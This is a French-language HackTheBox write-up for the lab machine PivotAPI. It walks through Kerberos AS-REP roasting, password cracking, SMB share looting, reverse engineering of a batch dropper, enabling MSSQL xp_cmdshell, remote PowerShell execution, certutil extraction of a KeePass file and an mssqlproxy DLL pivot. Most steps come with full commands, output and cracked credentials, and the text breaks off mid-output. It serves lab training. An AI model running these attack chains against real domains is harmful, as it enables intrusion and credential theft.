---
title: "HackTheBox - PivotAPI"
layout: "post"
categories: "Windows"
tags: ["HackTheBox", "Writeup", "Active Directory", "Reverse Engineering"]
---

PivotAPI is a Windows machine from the HackTheBox platform noted Insane released on May 08, 2021. It covers Kerberos missconfiguration, ACL, weak password cracking on a Keepass database, FTP server missconfiguration, as well as a bit of .NET reverse engineering. 😃

## Port Scanning

Tout d'abord, faisons un scan nmap des ports TCP :

```bash
❯ nmap -sCV -p- 10.10.10.240 -Pn --open -T5 -oN nmap
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-08 21:41:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: LICORDEBELLOTA
|   NetBIOS_Domain_Name: LICORDEBELLOTA
|   NetBIOS_Computer_Name: PIVOTAPI
|   DNS_Domain_Name: LicorDeBellota.htb
|   DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|   DNS_Tree_Name: LicorDeBellota.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-05-08T21:38:56
|_Not valid after:  2051-05-08T21:38:56
|_ssl-date: 2021-05-08T21:42:57+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Dans le certificat SSL du serveur MSSQL :
- Nom NetBIOS de la machine : `PIVOTAPI`
- Nom du domaine Active Directory : `LicorDeBellota.htb`

On peut ajouter le FQDN du DC dans notre fichier de configuration `/etc/hosts` :

```bash
❯ echo "10.10.10.240 PivotAPI.LicorDeBellota.htb" | sudo tee -a /etc/hosts
```

## FTP Anonymous Access

Avec les scripts NSE par défaut, on voit que l'accès avec l'utilisateur anonymous sur le serveur FTP est activé.
On récupère le contenu hosted :

```bash
❯ wget -r --user="anonymous" ftp://PivotAPI.LicorDeBellota.htb/
```

## Information Leakage in the exif data of PDF files

Les données exif contenu dans ces fichiers pdf nous permettent de leak des potentiels noms d'utilisateur de compte de domaine :

```bash
❯ exiftool * | egrep "Creator|Author"
Creator                         : Microsoft Word
Author                          : Unknown
Author                          : saif
Creator                         : Microsoft® Word 2013
Creator                         : byron gronseth
Creator Tool                    : Microsoft Word: cgpdftops CUPS filter
Author                          : byron gronseth
Creator                         : cairo 1.10.2 (http://cairographics.org)
Creator                         : Kaorz
Creator Tool                    : PScript5.dll Version 5.2.2
Creator                         : alex
Author                          : alex
```

On créer une wordlist avec ces noms d'utilisateur :

```bash
❯ exiftool * | egrep 'Creator|Author' | awk '{print $3}' > users.lst
```

On peut spray ces utilisateurs avec l'outil [kerbrute](https://github.com/ropnop/kerbrute) :

```bash
❯ kerbrute userenum -d LicorDeBellota.htb users.lst --dc PivotAPI.LicorDeBellota.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/07/22 - Ronnie Flathers @ropnop

2022/11/07 17:46:39 >  Using KDC(s):
2022/11/07 17:46:39 >  	PivotAPI.LicorDeBellota.htb:88

2022/11/07 17:46:39 >  [+] VALID USERNAME:	Kaorz@LicorDeBellota.htb
2022/11/07 17:46:39 >  Done! Tested 12 usernames (1 valid) in 0.081 seconds
```

Le nom d'utilisateur Kaorz est valide.

## ASREProast Kaorz account & Crack his password

Kaorz est un compte de domaine AS_REP Roastable car la pré-authentification Kerberos n’est pas activé pour cette utilisateur. Nous pouvons alors demander un TGT au KDC à son nom et cracker une partie de la réponse KRB_AS_REP qui contient une clé de session chiffré avec son hash NT. (Pour plus d'informations je vous invite à lire l'[article de pixis sur l'AS_REP Roasting](https://beta.hackndo.com/kerberos-asrep-roasting/) qui est super, de même pour le [GitBook de Shutdown](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)) :

```bash
❯ GetNPUsers.py -request -format john -no-pass -dc-ip PivotAPI.LicorDeBellota.htb LicorDeBellota.htb/Kaorz

[*] Getting TGT for Kaorz
$krb5asrep$Kaorz@LICORDEBELLOTA.HTB:477cd0d9ffcf18230a5cecfd9ad89ae9$ef94db3d2ada646a80954727bc205d7ee7880ee335e40913a28d4f430589b2e8def4a9246f72db2fcfc55ecf844021230c3f1345cc26f9a00d631c217af5c09428cff9d0f94035305ede2fb5319f93bc953162d73997debcc6fa977d8ae1f9d6f59f859ce63b1e5d9f3dc9fa7bfa933d8b9d964b5f7e1c8cb962b6531c2305121cc20948e69df34147091a561fbcfc3862d18fa8ad6a64e058b71475976c2232002f5cf22d7846abfe4098669c65ce9c6dffb651b46ab0a59b94ea5ba3d6bf5a2625cf2c947279775930185bd3e68b40c44fcbe7f331b536de3db2829c04ca9aa31758391b0f4e7096cde86c47d8b9728323d846b18e21fc
❯ john kaorz.tgt --wordlist=$(locate rockyou.txt)
Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Roper4155        ($krb5asrep$kaorz@LICORDEBELLOTA.HTB)
1g 0:00:00:06 DONE (2021-05-09 00:06) 0.1582g/s 1688Kp/s 1688Kc/s 1688KC/s Rosese08..Ronald72
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Nous avons un premier compte de domaine compromis : `Kaorz:Roper4155`

## SMB Enumeration : Leak Outlook Mails

Maintenant que nous sommes un utilisateur authentifié sur le domaine on peut aller voir les shares auxquelles nous avons accès :

```bash
 cme smb PivotAPI.LicorDeBellota.htb -u 'Kaorz' -p 'Roper4155' --shares
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [+] LicorDeBellota.htb\Kaorz:Roper4155
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [+] Enumerated shares
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         Share           Permissions     Remark
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         -----           -----------     ------
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         ADMIN$                          Admin remota
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         C$                              Recurso predeterminado
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         IPC$            READ            IPC remota
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         NETLOGON        READ            Recurso compartido del servidor de inicio de sesión
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         SYSVOL          READ            Recurso compartido del servidor de inicio de sesión
```

À première vu rien de non commum mais en faisant du spidering sur les shares avec le module [spider_plus](https://wiki.porchetta.industries/smb-protocol/spidering-shares) de [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec), on découvre un PE `Restart-OracleService.exe` et 2 fichiers avec une extension `MSG` dans le share SYSVOL. Ces fichiers sont des exports de mail Outlook, essayons de les télécharger et de les ouvrir :

```bash
❯ cme smb PivotAPI.LicorDeBellota.htb -u 'Kaorz' -p 'Roper4155' --shares -M spider_plus
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [+] LicorDeBellota.htb\Kaorz:Roper4155
SPIDER_P... PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*] Started spidering plus with option:
SPIDER_P... PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*]        DIR: ['print$']
SPIDER_P... PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*]        EXT: ['ico', 'lnk']
SPIDER_P... PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*]       SIZE: 51200
SPIDER_P... PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*]     OUTPUT: /tmp/cme_spider_plus
❯ cat /tmp/cme_spider_plus/PivotAPI.LicorDeBellota.htb.json | jq 'map_values(keys)'
{
  "IPC$": [
    "InitShutdown",
    "LSM_API_service",
    "MSSQL$SQLEXPRESS\\sql\\query",
    "PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER",
    "ROUTER",
    "RpcProxy\\49673",
    "RpcProxy\\593",
    "SQLLocal\\SQLEXPRESS",
    "W32TIME_ALT",
    "Winsock2\\CatalogChangeListener-1cc-0",
    "Winsock2\\CatalogChangeListener-250-0",
    "Winsock2\\CatalogChangeListener-264-0",
    "Winsock2\\CatalogChangeListener-264-1",
    "Winsock2\\CatalogChangeListener-364-0",
    "Winsock2\\CatalogChangeListener-460-0",
    "Winsock2\\CatalogChangeListener-5e8-0",
    "Winsock2\\CatalogChangeListener-b30-0",
    "Winsock2\\CatalogChangeListener-b78-0",
    "atsvc",
    "de6b567e41685d69",
    "epmapper",
    "eventlog",
    "lsass",
    "msfte\\MSSQL15.SQLEXPRESSF734f09daf4e36f4be6fad76f78b03b41457ag4bffCBStatus",
    "msfte\\MSSQL15.SQLEXPRESSF734f09daf4e36f4be6fad76f78b03b41457ag4bffFDReq",
    "msfte\\MSSQL15.SQLEXPRESSF734f09daf4e36f4be6fad76f78b03b41457ag4bffFTEtoFDAdmin",
    "netdfs",
    "ntsvcs",
    "openssh-ssh-agent",
    "scerpc",
    "srvsvc",
    "vgauth-service",
    "wkssvc"
  ],
  "NETLOGON": [
    "HelpDesk/Restart-OracleService.exe",
    "HelpDesk/Server MSSQL.msg",
    "HelpDesk/WinRM Service.msg"
  ],
  "SYSVOL": [
    "LicorDeBellota.htb/Policies/{22027191-6A36-4F0F-951F-31AA56DEC705}/GPT.INI",
    "LicorDeBellota.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI",
    "LicorDeBellota.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf",
    "LicorDeBellota.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol",
    "LicorDeBellota.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI",
    "LicorDeBellota.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf",
    "LicorDeBellota.htb/scripts/HelpDesk/Restart-OracleService.exe",
    "LicorDeBellota.htb/scripts/HelpDesk/Server MSSQL.msg",
    "LicorDeBellota.htb/scripts/HelpDesk/WinRM Service.msg"
  ]
}
❯ smbclient.py LicorDeBellota.htb/'Kaorz':'Roper4155'@PivotAPI.LicorDeBellota.htb
# use SYSVOL
# cd LicorDeBellota.htb/scripts/HelpDesk
# ls
drw-rw-rw-          0  Sun Aug  9 17:40:36 2020 .
drw-rw-rw-          0  Sun Aug  9 17:40:36 2020 ..
-rw-rw-rw-    1854976  Fri Feb 19 12:33:15 2021 Restart-OracleService.exe
-rw-rw-rw-      24576  Sun Aug  9 17:40:36 2020 Server MSSQL.msg
-rw-rw-rw-      26112  Sun Aug  9 13:45:39 2020 WinRM Service.msg
# mget *
[*] Downloading Restart-OracleService.exe
[*] Downloading Server MSSQL.msg
[*] Downloading WinRM Service.msg
```

Comme je n’ai pas Outlook j'ai [converti ces fichiers MSG en fichiers EML](https://www.zamzar.com/fr/convert/msg-to-eml) pour pouvoir les ouvrir sur Thunderbird :

![mail1](https://i.imgur.com/urBFJ3V.png)
![mail2](https://i.imgur.com/zUmmlA1.png)

Pour résumer :
- L’équipe de HelpDesk signale à cybervaca que l’entreprise a migré leur DMBS de Oracle (utilisé en 2010) à MSSQL en 2020. Ils ont developpé un programme nommé "Restart-Service.exe" qui permet de se log à Oracle et restart le service
- L’équipe HelpDesk a envoyé un mail pour dire que depuis le dernier pentest ils ont créer une rule sur leur firewall pour bloqur les ports WinRM. (5985 & 5986)
- Le firewall bloque les ports TCP, UDP et l'ICMP en sortie

## Reverse Restart-OracleService.exe binary

Maintenant que nous avons regardé les mails, essayons de reverse l'exécutable `Restart-OracleService.exe`.
On voit avec [Procmon64 de la suite Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) qu’il run un subprocess en exécutant un script batch temporaire :

![subprocess](https://i.imgur.com/g1bKTyu.png)

Cependant il est supprimé lors de la fermeture du processus. Nous pouvons modifier les DACLs de notre utilisateur local (test) sur le dossier et sous dossiers du path `C:\Users\test\AppData\Local\Temp\`, en désactivant l’héritage, afin de lui retirer l’ACE de suppression et récupérer le script batch exécuté :

![dacl](https://i.imgur.com/88XYUj6.png)

Après l'exécution du PE on voit qu’on a bien un [script batch](https://anonfiles.com/Fe09t8Geya/7DEC_bat) dans le dossier temporaire du profil de l’utilisateur :

```batch
@shift /0
@echo off

if %username% == cybervaca goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
<...>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe

:error
```

Pour résumer :
- Si la variable d'environnement `%username%` est égale à cybervaca, frankytech ou ev4si0n, le script drop 2 fichiers sur le disque :
	1. `C:\programdata\oracle.txt` : contient une string en base64 qui s'avère être le binaire `restart-service.exe` encodé
	2. `C:\programdata\monta.ps1` : script powershell qui décode le contenu du fichier `oracle.txt` vers un fichier nommé `restart-service.exe` pour rebuild le PE qui redémarre le service Oracle
- Supprime les 3 fichiers dropped sur le disque

En modifiant le script batch, on peut récupérer l'exécutable :

```batch
@shift /0
@echo off

if %username% == test goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
<...>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
c:\programdata\restart-service.exe

:error
```

Pour résumer :
- On modifie le check de la variable d'environnement `%username%` avec notre utilisateur local valide
- On efface les commandes de suppression de fichier

On a bien accès au binaire mentionné dans les mails de l'équipe HelpDesk :

![restart-service](https://i.imgur.com/YQROPuB.png)

Il faut savoir que lorsqu'un développeur Windows souhaite obfusqué ses intentions, il n'importe pas statiquement une librairie mais il préférable de mapper une DLL au runtime du programme pour ne pas que la fonction soit indexé dans l'IAT. (Import Address Table)
L'IAT est simplement une structure qui contient les adresses des fonctions importées dans un PE depuis les DLL.

Pour se faire, il faut utiliser 2 fonctions de la librairie `kernel32.dll` :
- `LoadLibrary()` : permet de charger une DLL en mémoire et retourner son adresse (si la librairie est déjà en mémoire la fonction retourne juste l’adresse)
- `GetProcAddress()` : permet de récupérer l’adresse d’une fonction dans la librairie précédemment chargé

Exemple avec la fonction `MessageBoxA()` :

```cpp
#include <stdlib.h>
#include <windows.h>

typedef int(WINAPI* MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);

int main(void) {
    HMODULE h = LoadLibraryA("kernel32.dll");
    MessageBoxA messageBoxA = (MessageBoxA)GetProcAddress(h, "MessageBoxA");
}
```

En monitorant les calls à la WinAPI avec l’outil [API Monitor](http://www.rohitab.com/apimonitor) et en filtrant avec le keyword "GetProcAddress" on trouve des appels à la fonction `CreateProcessWithLogonW()` :

![getprocaddress](https://i.imgur.com/x8UsMZC.png)

[CreateProcessWithLogonW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) est une fonction intéréssante car elle créer un nouveau processus, ce dernier exécute le programme spécifié dans un contexte de sécurité spécifié.

On monitore cette fonction :

![createprocesswithlogonw](https://i.imgur.com/HnsIhuF.png)

On a les credentials du compte de service Oracle : `svc_oracle:#oracle_s3rV1c3!2010`, cependant le compte n'est pas valide.

## Enable xp_cmdshell in MSSQL with sa user

Étant donné que l'entreprise a migré leur DMBS de Oracle à MSSQL en 2020, on en déduit que les credentials pour se connecter au serveur MSSQL sont : `svc_mssql:#mssql_s3rV1c3!2020`. On peut vérifier que l'utilisateur svc_mssql existe dans l'annuaire LDAP en utilisant [ldeep](https://github.com/franc-pentest/ldeep) ou le collecteur [BloodHound.py](https://github.com/fox-it/BloodHound.py) :

```bash
❯ ldeep ldap -u 'Kaorz' -p 'Roper4155' -d LicorDeBellota.htb -s ldap://PivotAPI.LicorDeBellota.htb users
0xdf
ippsec
aDoN90
Jharvar
OscarAkaElvis
Fiiti
socketz
Gh0spp7
FrankyTech
v1s0r
borjmz
manulqwerty
StooormQ
0xVIC
lothbrok
gibdeon
sshd
svc_mssql
Dr.Zaiuss
superfume
jari
Kaorz
3v4Si0N
krbtgt
cybervaca
Invitado
Administrador
```

Les credentials du compte de service MSSQL sont valides, cependant impossible de se connecter au serveur MSSQL, surement parce que il n'accepte pas les authentifications via l'AD :

```bash
❯ cme smb PivotAPI.LicorDeBellota.htb -u 'svc_mssql' -p '#mssql_s3rV1c3!2020'
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         PivotAPI.LicorDeBellota.htb 445    PIVOTAPI         [+] LicorDeBellota.htb\svc_mssql:#mssql_s3rV1c3!2020
❯ mssqlclient.py 'svc_mssql':'#mssql_s3rV1c3!2020'@PivotAPI.LicorDeBellota.htb -windows-auth

[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'LICORDEBELLOTA\svc_mssql'.
```

Essayons avec l'utilisateur "sa" qui a les privilèges sysadmin :

```bash
❯ mssqlclient.py 'sa':'#mssql_s3rV1c3!2020'@PivotAPI.LicorDeBellota.htb

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

Avec cette utilisateur nous pouvons activer la feature `xp_cmdshell` :

```bash
SQL> enable_xp_cmdshell
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 185: Se ha cambiado la opción de configuración'show advanced options' de 0 a 1. Ejecute la instrucción RECONFIGURE para instalar.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 185: Se ha cambiado la opción de configuración'xp_cmdshell' de 0 a 1. Ejecute la instrucción RECONFIGURE para instalar.
SQL> xp_cmdshell whoami

--------------------------------------------------------------------------------

nt service\mssql$sqlexpress
```

À cause du firewall qui bloque les ports sortants ainsi que les ports WinRM entrants, on ne peut pas récupérer de reverse shell.

### Method 1 : Recover KeePass database with local PSRemoting through xp_cmdshell

On lance un BloodHound.py pour trouver un utilisateur pouvant PSRemote. Cependant, il est fréquent que ce collecteur ait un problème de résolution DNS, on peut donc simuler les requetes DNS en configurant un DNS proxy avec l'outil [dnschef](https://github.com/iphelix/dnschef) :

```bash
❯ sudo python3 dnschef.py --fakeip 10.10.10.240 --fakedomains PivotAPI.LicorDeBellota.htb -q # Create fake A record
❯ bloodhound-python -d LicorDeBellota.htb -c all,loggedon --zip -u 'svc_mssql' -p '#mssql_s3rV1c3!2020' -dc PivotAPI.LicorDeBellota.htb -ns 127.0.0.1
INFO: Found AD domain: licordebellota.htb
INFO: Connecting to LDAP server: PivotAPI.LicorDeBellota.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: PivotAPI.LicorDeBellota.htb
INFO: Found 27 users
INFO: Connecting to GC LDAP server: pivotapi.licordebellota.htb
INFO: Found 57 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 10S
INFO: Compressing output into 20221108005951_bloodhound.zip
```

Lors de l'import du dump sur BloodHound, il est possible d'avoir une erreur "File created from incompatible collector", cela est du à un conflict de version, il est possible d'utiliser [bloodhound-convert](https://github.com/szymex73/bloodhound-convert) pour remédier à ce problème.

L'utilisateur jari et les membres du groupe WinRM ont la capacité de créer une connexion PSRemote vers la machine PivotAPI.LicorDeBellota.htb (Custom Query : `MATCH p=()-[r:CanPSRemote]->() RETURN p LIMIT 25`) :

![bh1](https://i.imgur.com/e7kNWxf.png)

De plus, l'utilisateur svc_mssql est un membre du groupe WinRM :

![bh2](https://i.imgur.com/1P0AHqg.png)

On peut créer un [objet PSCredential](https://microsofttouch.fr/default/b/sylver/posts/powershell-creer-un-objet-pscredential) et faire un `Invoke-Command` en powershell avec l'objet à travers xp_cmdshell pour exécuter des commandes en tant que svc_mssql. En faisant un `gci -recurse` sur `C:\Users\` (car il y a beaucoup de profil d’utilisateurs locaux) on voit qu’il y a une database KeePass :

```powershell
SQL> xp_cmdshell "powershell -c "$SecPassword = ConvertTo-SecureString \"#mssql_s3rV1c3!2020\" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential(\"LicorDeBellota\svc_mssql\", $SecPassword); Invoke-Command -Credential $cred -ComputerName PivotAPI { powershell -c \"gci -recurse C:/Users/ \" }"

Directorio: C:\Users\svc_mssql\Desktop

Mode                LastWriteTime         Length Name


----                -------------         ------ ----


-a----       08/08/2020     22:12           2286 credentials.kdbx
```

On encode la db KeePass en base64 avec certutil et on récupère la string en base64 :

```powershell
SQL> xp_cmdshell "powershell -c "$SecPassword = ConvertTo-SecureString \"#mssql_s3rV1c3!2020\" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential(\"LicorDeBellota\svc_mssql\", $SecPassword); Invoke-Command -Credential $cred -ComputerName PivotAPI { powershell -c \"certutil -encode C:/Users/svc_mssql/Desktop/credentials.kdbx C:\Windows\Temp\credentials_keepass.b64; cat C:/Windows/Temp/credentials_keepass.b64 \" }"

--------------------------------------------------------------------------------

Longitud de entrada = 2286

Longitud de salida = 3200

CertUtil: -encode comando completado correctamente.
SQL> exit
❯ vim db_keepass.b64
❯ base64 -d db_keepass.b64 > credentials.kdbx
```

### Method 2 : Recover KeePass database with MSSQL proxy

On peut utiliser l'outil [mssqlproxy](https://github.com/blackarrowsec/mssqlproxy) pour charger une DLL au sein du serveur MSSQL afin de créer un proxy SOCKS5 qui nous permettra d'accéder aux ports internes.

On upload la DLL nécéssaire dans un répertoire généralement non surveillé par AppLocker :

```bash
❯ python3 mssqlclient.py 'sa':'#mssql_s3rV1c3!2020'@PivotAPI.LicorDeBellota.htb
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL> enable_ole
SQL> upload reciclador.dll C:\Windows\Tasks\reciclador.dll
[+] Uploading 'reciclador.dll' to 'C:\Windows\Tasks\reciclador.dll'...
[+] Size is 111616 bytes
[+] Upload completed
```

On installe l'assembly CLR pour déployer le proxy :

```bash
❯ python3 mssqlclient.py 'sa':'#mssql_s3rV1c3!2020'@PivotAPI.LicorDeBellota.htb -install -clr Microsoft.SqlServer.Proxy.dll
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[*] Proxy mode: install
[*] CLR enabled
[*] Assembly successfully installed
[*] Procedure successfully installed
```

On check que la DLL est bien chargé :

```bash
❯ python3 mssqlclient.py 'sa':'#mssql_s3rV1c3!2020'@PivotAPI.LicorDeBellota.htb -check -reciclador 'C:\Windows\Tasks\reciclador.dll'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
```

Enfin, on start le proxy :

```bash
❯ python3 mssqlclient.py 'sa':'#mssql_s3rV1c3!2020'@PivotAPI.LicorDeBellota.htb -start -reciclador 'C:\Windows\Tasks\reciclador.dll'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
